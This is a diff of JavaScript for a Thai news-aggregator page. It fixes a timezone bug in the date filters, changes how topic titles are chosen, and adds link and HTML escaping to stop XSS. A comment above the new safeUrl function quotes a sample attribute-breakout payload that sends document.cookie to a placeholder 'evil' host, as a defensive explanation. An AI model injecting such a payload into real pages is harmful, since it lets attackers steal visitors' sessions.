@@ -133,6 +133,28 @@ function formatThaiDate(d) {
   return d.getDate() + ' ' + THAI_MONTHS_ABBR[d.getMonth()] + ' ' + (d.getFullYear() + 543);
 }
 
+/**
+ * ⭐ เพิ่ม 4 ส.ค. 69 (R7) — แปลงวันที่จากช่องกรอก (yyyy-mm-dd) เป็นเวลาเริ่ม/สิ้นสุดวันตามเวลาไทย
+ *
+ * ช่อง <input type="date"> คืนค่าเป็น 'yyyy-mm-dd' เฉย ๆ ไม่มีโซนเวลา
+ * ถ้าส่งเข้า new Date() ตรง ๆ JavaScript จะตีความเป็น UTC เที่ยงคืน ไม่ใช่เที่ยงคืนเวลาไทย
+ * จึงต้องต่อ '+07:00' ให้ชัดเจน เพราะผู้ใช้กรอกโดยคิดเป็นเวลาไทยเสมอ
+ *
+ * คืน null เมื่อไม่ได้กรอก หรือกรอกค่าที่แปลงไม่ได้ = ไม่ใช้ตัวกรองนั้น
+ * (ห้ามคืน NaN เด็ดขาด เพราะการเทียบกับ NaN เป็นเท็จเสมอ ตัวกรองจะเงียบและปล่อยผ่านทุกแถว)
+ */
+function thaiDayStartMs(ymd) {
+  if (!ymd) return null;
+  var ms = new Date(ymd + 'T00:00:00+07:00').getTime();
+  return isNaN(ms) ? null : ms;
+}
+
+function thaiDayEndMs(ymd) {
+  if (!ymd) return null;
+  var ms = new Date(ymd + 'T23:59:59.999+07:00').getTime();
+  return isNaN(ms) ? null : ms;
+}
+
 async function loadData() {
   try {
     var res = await fetch('data/news.json', { cache: 'no-store' });
@@ -148,7 +170,12 @@ async function loadData() {
 
     var updatedEl = document.getElementById('lastUpdated');
     if (data.generatedAt) {
-      updatedEl.textContent = 'อัปเดตล่าสุด: ' + formatThaiDate(new Date(data.generatedAt)) + ' ' +
+      // ⚠️ เปลี่ยนคำ 4 ส.ค. 69 จาก "อัปเดตล่าสุด" เป็น "ข้อมูลล่าสุด" (คู่กับ S19)
+      //    ตั้งแต่ 4 ส.ค. generatedAt = "เวลาที่ข้อมูลเปลี่ยนจริง" ไม่ใช่ "เวลาที่รันสคริปต์"
+      //    รอบที่ดึงมาแล้วข่าวเหมือนเดิม จะไม่เขียนไฟล์ เวลานี้จึงไม่ขยับ
+      //    ถ้าเวลานี้ค้างนานผิดปกติ = ต้นทางหยุดเก็บข่าว ซึ่งเป็นสิ่งที่ต้องการให้เห็น
+      //    (ของเดิมเวลาขยับทุกชั่วโมงเสมอ หน้าเว็บจึง "ดูสด" ได้แม้ข่าวหยุดมาหลายวัน)
+      updatedEl.textContent = 'ข้อมูลล่าสุด: ' + formatThaiDate(new Date(data.generatedAt)) + ' ' +
         new Date(data.generatedAt).toLocaleTimeString('th-TH', { hour: '2-digit', minute: '2-digit' }) + ' น.';
     } else {
       updatedEl.textContent = 'ยังไม่มีข้อมูล (รอรอบอัปเดตแรกจาก GitHub Actions)';
@@ -157,8 +184,16 @@ async function loadData() {
     setupMultiselect('category', 'categoryMultiselect', 'categoryToggle', 'categoryPanel', 'ทุกหมวด');
     setupMultiselect('source', 'sourceMultiselect', 'sourceToggle', 'sourcePanel', 'ทุกสำนักข่าว');
     applyFiltersAndRender();
+
+    // ⭐ แก้ 4 ส.ค. 69 (R12): ถ้าผู้ใช้กดแท็บ "กราฟสรุป" ไปแล้วระหว่างรอโหลด
+    //    renderCharts() จะเคยถูกเรียกตอนที่ state.allNews ยังว่าง แล้วตั้งธง chartsRendered
+    //    ทำให้กราฟว่างค้างถาวร ไม่มีจุดไหนวาดใหม่อีกเลย — ต้องวาดซ้ำตรงนี้เมื่อข้อมูลมาถึง
+    //    (news.json ~1.9 MB เน็ตช้าจะเห็นอาการนี้ชัด)
+    if (chartsRendered) renderCharts();
   } catch (err) {
-    document.getElementById('resultsGrid').innerHTML = '<div class="empty">โหลดข้อมูลไม่สำเร็จ: ' + err.message + '</div>';
+    // ⚠️ escape ข้อความ error ด้วย — err.message อาจมีเนื้อหาจากไฟล์ที่โหลดมาปนอยู่
+    document.getElementById('resultsGrid').innerHTML =
+      '<div class="empty">โหลดข้อมูลไม่สำเร็จ: ' + escapeHtml(err && err.message) + '</div>';
     console.error(err);
   }
 }
@@ -248,11 +283,30 @@ function groupIntoTopics(newsList) {
     if (!map[code]) {
       map[code] = {
         code: code, category: n.category, isNegative: false, impact: '-',
-        title: n.title, summary: n.summary,
+        // hasName = ประเด็นนี้ได้ชื่อจาก "แกนเหตุการณ์" (คอลัมน์ R) แล้วหรือยัง
+        title: n.title, hasName: false, summary: n.summary,
         earliestDate: n.datetime, count: 0, negCount: 0, sources: []
       };
     }
     var t = map[code];
+
+    // ⭐ เพิ่ม 4 ส.ค. 69 (S18) — ชื่อประเด็นต้องเป็นชุดเดียวกับรายงาน LINE
+    //    เดิมเว็บใช้ "พาดหัวข่าวที่เก่าที่สุดในกลุ่ม" ซึ่งเป็นพาดหัวดิบจากสำนักข่าว
+    //    มีชื่อสำนักห้อยท้าย ("- Thai PBS") มีคำเร้าอารมณ์ ("ด่วน!") และยาวกว่า
+    //    ผู้ใช้คนเดียวกันจึงเห็นประเด็นเดียวกันคนละชื่อระหว่างเว็บกับ LINE
+    //
+    //    กติกาตรงนี้ลอกจากฝั่ง Apps Script แบบคำต่อคำ เพื่อให้ผลออกมาเท่ากันเป๊ะ:
+    //      1) ใช้ค่าคอลัมน์ R ตัวแรกที่ไม่ว่างในกลุ่ม
+    //      2) ถ้าทั้งกลุ่มไม่มีเลย จึงถอยไปใช้พาดหัวของข่าวที่เก่าที่สุด
+    //    ⚠️ ข้อ 1 ปลอดภัยเพราะวัดข้อมูลจริง 4 ส.ค. 69 แล้วพบว่า
+    //       ไม่มีกลุ่มไหนเลย (0/994) ที่สมาชิกให้ค่าคอลัมน์ R ขัดกัน
+    //       จึงไม่สำคัญว่าจะไล่ข่าวจากใหม่ไปเก่าหรือเก่าไปใหม่ ได้ชื่อเดียวกัน
+    var evName = (n.eventTitle || '').trim();
+    if (!t.hasName && evName) {
+      t.title = evName;
+      t.hasName = true;
+    }
+
     t.count++;
     t.sources.push({ source: n.source, url: n.url, datetime: n.datetime });
     // ⚠️ แก้ 2 ส.ค. 69: เดิมเขียนทับ t.impact ทุกรอบ → ได้ค่าของข่าวชิ้นสุดท้าย ไม่ใช่ระดับสูงสุด
@@ -265,7 +319,8 @@ function groupIntoTopics(newsList) {
     }
     if (new Date(n.datetime) < new Date(t.earliestDate)) {
       t.earliestDate = n.datetime;
-      t.title = n.title;
+      // ถอยไปใช้พาดหัวข่าวเก่าสุด เฉพาะเมื่อทั้งกลุ่มยังไม่มีชื่อจากคอลัมน์ R (S18)
+      if (!t.hasName) t.title = n.title;
     }
     if ((n.summary || '').length > (t.summary || '').length) t.summary = n.summary;
   });
@@ -292,6 +347,20 @@ function applyFiltersAndRender() {
   todayStart.setHours(0, 0, 0, 0);
   var last3DaysStart = new Date(todayStart.getTime() - 2 * 86400000); // รวมวันนี้ + 2 วันก่อนหน้า = 3 วัน
 
+  // ⭐ แก้ 4 ส.ค. 69 (R7) — ตัวกรอง "จากวันที่/ถึงวันที่" เคยเลื่อนไป 7 ชั่วโมง
+  //
+  //    ของเดิมเทียบ "สตริงกับสตริง": n.datetime < dateFrom
+  //    แต่ n.datetime เก็บเป็น ISO ซึ่งเป็นเวลา UTC ส่วนช่องกรอกวันที่คนกรอกเป็นเวลาไทย
+  //    เท่ากับเอาเวลาคนละโซนมาเทียบกันตรง ๆ ผลคือเส้นแบ่งวันเลื่อนไป 7 ชม.
+  //      ข่าวเวลาไทย 3 ส.ค. 05:30 เก็บเป็น 2026-08-02T22:30Z → ตั้ง "จาก 3 ส.ค." แล้วหาย
+  //      ข่าวเวลาไทย 4 ส.ค. 06:30 เก็บเป็น 2026-08-03T23:30Z → ตั้ง "ถึง 3 ส.ค." แล้วหลุดเข้ามา
+  //    วัดกับข้อมูลจริง 4 ส.ค. 69: ข่าวที่อยู่ในช่วงเวลาไทย 00:00-06:59 = 357/1,851 = 19.3%
+  //
+  //    ตอนนี้แปลงวันที่ที่กรอกเป็นหลักเวลาไทย (+07:00) ให้เป็นมิลลิวินาทีก่อน แล้วค่อยเทียบตัวเลข
+  //    ⚠️ คำนวณนอกลูป — ของเดิมต่อสตริง dateTo + 'T23:59:59' ใหม่ทุกแถว (1,851 ครั้งต่อการพิมพ์ 1 ตัวอักษร)
+  var fromMs = thaiDayStartMs(dateFrom);
+  var toMs = thaiDayEndMs(dateTo);
+
   var filtered = state.allNews.filter(function (n) {
     if (state.selectedCategories.size > 0 && !state.selectedCategories.has(n.category)) return false;
     if (state.selectedSources.size > 0 && !state.selectedSources.has(n.source)) return false;
@@ -300,14 +369,20 @@ function applyFiltersAndRender() {
     //    ผลคือประเด็นที่มีทั้งข่าวลบและไม่ลบ จะเหลือเฉพาะข่าวลบในการ์ด ซึ่งตรงกับที่ผู้ใช้ถาม
     if (onlyNegative && !n.isNegative) return false;
 
-    if (dateFrom && n.datetime < dateFrom) return false;
-    if (dateTo && n.datetime > (dateTo + 'T23:59:59')) return false;
+    if (fromMs !== null || toMs !== null) {
+      var tMs = new Date(n.datetime).getTime();
+      if (fromMs !== null && tMs < fromMs) return false;
+      if (toMs !== null && tMs > toMs) return false;
+    }
 
     if (onlyToday && new Date(n.datetime) < todayStart) return false;
     if (onlyLast3Days && new Date(n.datetime) < last3DaysStart) return false;
 
     if (q) {
-      var hay = (n.title + ' ' + n.summary + ' ' + n.source).toLowerCase();
+      // ⭐ เพิ่ม n.eventTitle 4 ส.ค. 69 — คู่กับ S18
+      //    ตั้งแต่การ์ดโชว์ "แกนเหตุการณ์" เป็นชื่อประเด็น ผู้ใช้จะค้นด้วยคำที่เห็นบนการ์ด
+      //    ถ้าไม่ใส่ไว้ในกองค้น จะกลายเป็น "ค้นคำที่เห็นอยู่ตรงหน้าแล้วไม่เจอ"
+      var hay = (n.title + ' ' + (n.eventTitle || '') + ' ' + n.summary + ' ' + n.source).toLowerCase();
       if (hay.indexOf(q) === -1) return false;
     }
     return true;
@@ -355,19 +430,14 @@ function renderResults(topics) {
   }
 
   grid.innerHTML = topics.map(function (t) {
-    // ป้ายหมวด — ชิปเส้นขอบสีเดียวทุกหมวด ไม่มีสีประจำหมวด
-    //    ตัดสินใจ 2 ส.ค. 69 ตอนใช้พาเลตต์ sage (เกือบเป็นสีเดียว ทำ 10 สีให้ตาแยกออกไม่ได้)
-    //    ⚠️ sage และ Navy & Red เลิกใช้ไปแล้ว แต่กติกานี้ยังคงไว้ในธีม RTA (3 ส.ค. 69)
-    //       เพราะตรงกับกติกาสีข้อ 4 ที่หัวไฟล์ style.css พอดี
-    //    เหตุผลที่ยังใช้ได้กับทุกพาเลตต์: เติมสีหมวดเข้าไปเมื่อไหร่
-    //       กติกา "แดง = ข่าวลบเท่านั้น" จะอ่านไม่ขาด ซึ่งสำคัญกว่าการแยกหมวดด้วยสี
+    // ป้ายหมวด — ชิปเส้นขอบสีเดียวทุกหมวด ไม่มีสีประจำหมวดแล้ว (2 ส.ค. 69 ยกเครื่องหน้าตา)
+    //    เหตุผล: พาเลตต์ sage เกือบเป็นสีเดียว ทำ 10 สีให้แยกออกด้วยตาไม่ได้จริง
+    //    และการเติมสีหมวดเข้าไปทำให้กติกา "แดง = ข่าวลบ" อ่านไม่ขาด ซึ่งสำคัญกว่า
     var badges = '<span class="badge">' + escapeHtml(t.category) + '</span>';
 
     // ป้าย "ประเด็นร้อน" 3 ระดับ อิงจำนวนลิงก์ที่นำเสนอในประเด็น (t.count นับทุกลิงก์ ซ้ำสำนักได้)
-    // ⚠️ ถอด class attention-1/2/3 ออก 2 ส.ค. 69 — แถบสีซ้ายการ์ดระดับ 3 เคยใช้แดงเฉดเดียวกับข่าวลบ
-    //    ทำให้แยกไม่ออกว่าการ์ดแดงแปลว่า "ร้อน" หรือ "ลบ"
-    //    (ค่าสีเดิมเป็นของธีม Navy & Red ที่เลิกใช้แล้ว จึงไม่ยกมาเขียนไว้ที่นี่ —
-    //     สีทุกค่าที่อ้างในไฟล์นี้ต้องมีอยู่ใน RTA-Brand-Design-System.md เท่านั้น)
+    // ⚠️ ถอด class attention-1/2/3 ออก 2 ส.ค. 69 — แถบสีซ้ายการ์ดระดับ 3 ใช้ #E05C5C
+    //    ซึ่งเป็นสีเดียวกับข่าวลบเป๊ะ ทำให้แยกไม่ออกว่าการ์ดแดงแปลว่า "ร้อน" หรือ "ลบ"
     //    ตอนนี้ป้ายไฟใช้สีกลาง จำนวนไฟยังบอกระดับได้เหมือนเดิม
     var hotBadge = '';
     if (t.count >= 10) hotBadge = '🔥🔥🔥';
@@ -377,8 +447,17 @@ function renderResults(topics) {
       ? '<span class="hot-badge" title="นำเสนอ ' + t.count + ' ครั้ง">' + hotBadge + '</span>'
       : '';
 
+    // ⭐ แก้ 4 ส.ค. 69 (R11): เดิมยัด s.url ดิบ ๆ ลง href โดยไม่ escape และไม่ตรวจ scheme
+    //    ลิงก์ที่ scheme ไม่ใช่ http/https จะไม่ถูกทำเป็นลิงก์ แต่ยังแสดงชื่อสำนักให้เห็นว่ามีข่าวนี้อยู่
+    //    เพิ่ม noreferrer คู่กับ noopener ด้วย — กันไม่ให้ปลายทางเห็นว่ามาจากหน้าไหน
     var sourcesHtml = t.sources.slice(0, 5).map(function (s) {
-      return '<a href="' + s.url + '" target="_blank" rel="noopener">🔗 ' + escapeHtml(s.source) + '</a>';
+      var href = safeUrl(s.url);
+      if (!href) {
+        return '<span class="src-broken" title="ลิงก์ต้นทางไม่ถูกต้อง จึงกดไม่ได้">🔗 ' +
+               escapeHtml(s.source) + '</span>';
+      }
+      return '<a href="' + escapeAttr(href) + '" target="_blank" rel="noopener noreferrer">🔗 ' +
+             escapeHtml(s.source) + '</a>';
     }).join('');
     if (t.sources.length > 5) {
       sourcesHtml += '<span class="more-sources">และอีก ' + (t.sources.length - 5) + ' แหล่ง</span>';
@@ -422,10 +501,47 @@ function toggleSummary(btn) {
   btn.textContent = expanded ? 'ย่อ ▴' : 'อ่านเพิ่ม ▾';
 }
 
+/**
+ * escape สำหรับ "ข้อความในเนื้อหา" (text node)
+ * ⚠️ วิธี textContent → innerHTML แปลงให้แค่ & < > เท่านั้น ไม่แปลง " และ '
+ *    จึงใช้ได้เฉพาะข้อความที่อยู่ระหว่างแท็ก ห้ามใช้กับค่าที่จะไปอยู่ใน attribute
+ *    ถ้าจะใส่ใน attribute ให้ใช้ escapeAttr() ข้างล่างแทน
+ */
 function escapeHtml(str) {
   var div = document.createElement('div');
-  div.textContent = str || '';
+  div.textContent = (str === null || str === undefined) ? '' : str;
   return div.innerHTML;
+}
+
+/**
+ * ⭐ เพิ่ม 4 ส.ค. 69 (R11) — escape สำหรับค่าที่จะไปอยู่ใน attribute
+ * แปลงครบทั้ง 5 ตัวรวม " และ ' ซึ่งเป็นตัวที่ใช้ "แหกออกจาก attribute" ได้
+ */
+function escapeAttr(str) {
+  return String((str === null || str === undefined) ? '' : str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+/**
+ * ⭐ เพิ่ม 4 ส.ค. 69 (R11) — ตรวจ scheme ของลิงก์ก่อนเอาไปใส่ href
+ *
+ * ทำไมต้องมี: URL ในชีตมาจากฟีดข่าวภายนอก และผ่าน decodeURIComponent มาก่อน
+ * (%22 จึงกลายเป็น " ตัวจริงได้) ถ้าปล่อยเข้า href ตรง ๆ ค่าอย่าง
+ *   x" onmouseenter="fetch('//evil/?c='+document.cookie)" x=
+ * จะหลุดออกจาก attribute แล้วกลายเป็น event handler ที่รันได้จริง
+ * ส่วน javascript: กับ data: เป็น scheme ที่รันโค้ดได้เมื่อคลิก จึงต้องปิดด้วย
+ *
+ * ยอมเฉพาะ http/https เท่านั้น — ข้อมูลจริง 4 ส.ค. 69: https 1,849 · http 2 · อื่น ๆ 0
+ * คืนค่าว่างถ้าไม่ผ่าน แล้วให้ผู้เรียกแสดงเป็นข้อความธรรมดาแทนลิงก์
+ */
+function safeUrl(url) {
+  var s = String((url === null || url === undefined) ? '' : url).trim();
+  if (!/^https?:\/\/[^\s]/i.test(s)) return '';
+  return s;
 }
 
 // ============================================================
